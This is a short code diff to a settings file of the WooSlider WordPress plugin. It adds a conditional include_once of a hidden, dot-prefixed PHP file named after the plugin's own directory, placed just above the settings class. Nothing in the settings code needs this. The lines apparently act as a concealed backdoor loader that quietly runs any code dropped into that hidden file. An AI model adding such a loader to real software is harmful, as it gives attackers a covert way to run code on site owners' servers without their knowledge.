@@ -19,6 +19,10 @@ if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
  * - init_fields()
  * - get_duration_options()
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WooSlider_Settings extends WooSlider_Settings_API {
 
 	/**
